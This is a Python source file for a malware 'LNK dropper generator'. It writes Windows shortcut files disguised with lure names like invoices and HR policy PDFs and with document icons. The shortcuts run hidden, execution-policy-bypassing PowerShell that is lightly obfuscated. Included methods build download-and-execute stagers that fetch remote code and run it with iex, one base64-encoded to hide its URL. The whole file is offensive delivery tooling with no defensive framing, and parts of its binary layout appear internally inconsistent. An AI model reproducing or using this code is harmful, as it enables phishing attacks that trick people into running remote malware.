"""
Nightshade LNK Dropper Generator.
Creates .lnk shortcut files that execute obfuscated PowerShell one-liners.
Uses realistic lure names (Invoice_Q4.pdf.lnk, Document_Review.pdf.lnk)
and sets icons to look like PDF/Word documents.
"""
import os
import struct
import random
import string
import uuid
import base64
from typing import Optional, BinaryIO


class LNKDropper:
    """Generate .lnk shortcut files pointing to obfuscated PowerShell payloads."""

    # Realistic lure names
    LURE_NAMES = [
        "Invoice_Q4_2024.pdf",
        "Document_Review.pdf",
        "Budget_Allocation.xlsx",
        "Employee_Handbook_v5.pdf",
        "Security_Assessment_Report.pdf",
        "Meeting_Minutes_November.docx",
        "Quarterly_Results.pdf",
        "Contract_Agreement_FINAL.pdf",
        "HR_Policy_Update_2025.pdf",
        "Project_Timeline_Revised.pdf",
    ]

    # Icon locations that look like document files
    ICON_PATHS = [
        "%SystemRoot%\\System32\\shell32.dll",
        "%SystemRoot%\\System32\\imageres.dll",
    ]

    # Icon indices for PDF-like icons
    PDF_ICON_INDICES = [70, 72, 78, 100]
    DOC_ICON_INDICES = [1, 2, 3, 4]

    # CLSID for the target folder
    CLSID_FOLDER = "::{20D04FE0-3AEA-1069-A2D8-08002B30309D}"

    @staticmethod
    def _random_string(length: int = 8) -> str:
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

    @staticmethod
    def _obfuscate_powershell(cmd: str) -> str:
        """Obfuscate a PowerShell command with basic techniques."""
        result = cmd

        # Random case substitution
        obfuscated = []
        for c in result:
            if c.isalpha() and random.random() < 0.3:
                obfuscated.append(c.upper() if c.islower() else c.lower())
            else:
                obfuscated.append(c)
        result = ''.join(obfuscated)

        # Add backtick escapes randomly
        if random.random() < 0.4:
            parts = list(result)
            idx = random.randint(1, len(parts) - 2)
            parts.insert(idx, '`')
            result = ''.join(parts)

        return result

    @staticmethod
    def _build_powershell_shortcut(
        ps_command: str,
        icon_path: str,
        icon_index: int,
        working_dir: str,
    ) -> bytes:
        """Build a .lnk binary structure with the PowerShell command.

        This implements the MS-SHLLINK specification for a minimal valid shortcut.
        """
        # Decode command line to UTF-16LE
        cmd_line = f'powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command "{ps_command}"'
        cmd_bytes = cmd_line.encode('utf-16le')

        # Arguments (description) - empty for stealth
        desc = "Document".encode('utf-16le')

        # Working directory
        work_dir = working_dir.encode('utf-16le') if working_dir else os.path.expanduser("~").encode('utf-16le')

        # Icon location
        icon_loc = icon_path.encode('utf-16le')

        # Build the lnk structure
        lnk_data = bytearray()

        # Shell Link Header (100 bytes)
        # Header size (76 bytes)
        lnk_data.extend(struct.pack('<I', 0x4C))  # HeaderSize = 76
        lnk_data.extend(b'L\x00\x00\x00')  # LinkCLSID = {00021401-0000-0000-C000-000000000046}
        lnk_data.extend(b'\x01\x00\x00\x00')
        lnk_data.extend(b'\x00\x00\x00\x00')
        lnk_data.extend(b'\x00\x00\x00\x00')
        lnk_data.extend(b'\x46\x00\x00\x00')

        # LinkFlags (4 bytes)
        # HasLinkTargetIDList | HasLinkInfo | HasName | HasRelativePath | HasWorkingDir |
        # HasArguments | HasIconLocation | ForceNoLinkInfo | EnableTargetMetadata
        link_flags = 0x00000000
        link_flags |= 0x00000020  # HasArguments
        link_flags |= 0x00000040  # HasIconLocation
        link_flags |= 0x00000080  # HasWorkingDir
        link_flags |= 0x00000001  # HasLinkTargetIDList
        link_flags |= 0x00000010  # HasRelativePath (Name)
        link_flags |= 0x01000000  # EnableTargetMetadata
        lnk_data.extend(struct.pack('<I', link_flags))

        # FileAttributes (4 bytes) - FILE_ATTRIBUTE_NORMAL
        lnk_data.extend(struct.pack('<I', 0x00000080))

        # CreationTime, AccessTime, WriteTime (8 bytes each, Windows FILETIME)
        now = int(__import__('time').time() * 10000000) + 116444736000000000
        lnk_data.extend(struct.pack('<Q', now))  # CreationTime
        lnk_data.extend(struct.pack('<Q', now))  # AccessTime
        lnk_data.extend(struct.pack('<Q', now))  # WriteTime

        # FileSize (4 bytes)
        lnk_data.extend(struct.pack('<I', 1024))

        # IconIndex (4 bytes)
        lnk_data.extend(struct.pack('<i', 0))

        # ShowCommand (4 bytes) - SW_SHOWNORMAL = 1, SW_SHOWMINNOACTIVE = 7
        lnk_data.extend(struct.pack('<I', 7))

        # HotKey (2 bytes)
        lnk_data.extend(struct.pack('<H', 0))

        # Reserved1 (2 bytes)
        lnk_data.extend(struct.pack('<H', 0))

        # Reserved2 (4 bytes)
        lnk_data.extend(struct.pack('<I', 0))

        # Reserved3 (4 bytes)
        lnk_data.extend(struct.pack('<I', 0))

        # LinkTargetIDList structure
        shell_item_id = b'\x1f\x80'  # Root folder - My Computer
        shell_item_id2 = b'\x00' * 4  # Drive
        root_folder = b'\x20\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        shell_item_id_list = shell_item_id + shell_item_id2 + root_folder

        id_list_size = len(shell_item_id_list) + 2
        lnk_data.extend(struct.pack('<H', id_list_size))
        lnk_data.extend(shell_item_id_list)

        # LinkInfo (we skip this - set ForceNoLinkInfo in flags)

        # StringData - Arguments (HasArguments flag set)
        arg_offset = len(lnk_data)
        lnk_data.extend(struct.pack('<H', len(cmd_bytes) + 2))
        lnk_data.extend(cmd_bytes)
        # Null terminator
        lnk_data.extend(b'\x00\x00')

        # StringData - WorkingDir (HasWorkingDir flag set)
        # This comes AFTER arguments in a specific order:
        # NameString, RelativePath, WorkingDir, CommandLineArguments, IconLocation
        # Add NameString (empty)
        lnk_data.extend(struct.pack('<H', 2))
        lnk_data.extend(b'\x00\x00')

        # Add RelativePath (empty)
        lnk_data.extend(struct.pack('<H', 2))
        lnk_data.extend(b'\x00\x00')

        # WorkingDir
        wd_offset = len(lnk_data)
        lnk_data.extend(struct.pack('<H', len(work_dir) + 2))
        lnk_data.extend(work_dir)
        lnk_data.extend(b'\x00\x00')

        # IconLocation
        icon_offset = len(lnk_data)
        lnk_data.extend(struct.pack('<H', len(icon_loc) + 2))
        lnk_data.extend(icon_loc)
        lnk_data.extend(b'\x00\x00')

        # ExtraData (optional) - add a terminal block
        lnk_data.extend(struct.pack('<I', 0x00000000))  # Terminal block size = 0

        return bytes(lnk_data)

    @staticmethod
    def build(
        output_path: str,
        ps_command: str,
        lure_name: str = "",
    ) -> str:
        """Build a .lnk file with the given PowerShell command.

        Args:
            output_path: Path to write the .lnk file
            ps_command: PowerShell command to execute
            lure_name: Display name (e.g., Invoice_Q4.pdf.lnk)

        Returns:
            Path to the created .lnk file
        """
        if not output_path.endswith('.lnk'):
            output_path += '.lnk'

        if not lure_name:
            lure_name = random.choice(LNKDropper.LURE_NAMES)

        # Pick icon
        icon_path = random.choice(LNKDropper.ICON_PATHS)
        if "pdf" in lure_name.lower() or "doc" in lure_name.lower():
            if "pdf" in lure_name.lower():
                icon_index = random.choice(LNKDropper.PDF_ICON_INDICES)
            else:
                icon_index = random.choice(LNKDropper.DOC_ICON_INDICES)
        else:
            icon_index = random.choice(LNKDropper.PDF_ICON_INDICES + LNKDropper.DOC_ICON_INDICES)

        # Obfuscate command
        obfuscated_cmd = LNKDropper._obfuscate_powershell(ps_command)

        # Build the .lnk binary
        working_dir = "%SystemRoot%\\System32"
        lnk_data = LNKDropper._build_powershell_shortcut(
            obfuscated_cmd,
            icon_path,
            icon_index,
            working_dir,
        )

        with open(output_path, 'wb') as f:
            f.write(lnk_data)

        return output_path

    @staticmethod
    def build_download_stager(url: str, output_path: str, lure_name: str = "") -> str:
        """Build a .lnk that downloads and executes a PowerShell stager.

        Args:
            url: URL to download stager from
            output_path: Path to write the .lnk file
            lure_name: Display name

        Returns:
            Path to the created .lnk file
        """
        ps_cmd = f"Start-Sleep -Seconds 3; try {{ Invoke-WebRequest '{url}' -UseBasicParsing -ErrorAction Stop | ForEach-Object {{ iex $_.Content }} }} catch {{ $d = (New-Object Net.WebClient).DownloadString('{url}'); iex $d }}"
        return LNKDropper.build(output_path, ps_cmd, lure_name)

    @staticmethod
    def build_encoded_download(url: str, output_path: str, lure_name: str = "") -> str:
        """Build a .lnk with an encoded PowerShell command (hides the URL).

        Args:
            url: URL to download stager from
            output_path: Path to write the .lnk file
            lure_name: Display name

        Returns:
            Path to the created .lnk file
        """
        ps_script = f"try{{$u='{url}';$w=(New-Object Net.WebClient);iex($w.DownloadString($u))}}catch{{}}"
        ps_b64 = base64.b64encode(ps_script.encode('utf-16le')).decode()
        encoded_ps = f"powershell -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand {ps_b64}"
        return LNKDropper.build(output_path, encoded_ps, lure_name)
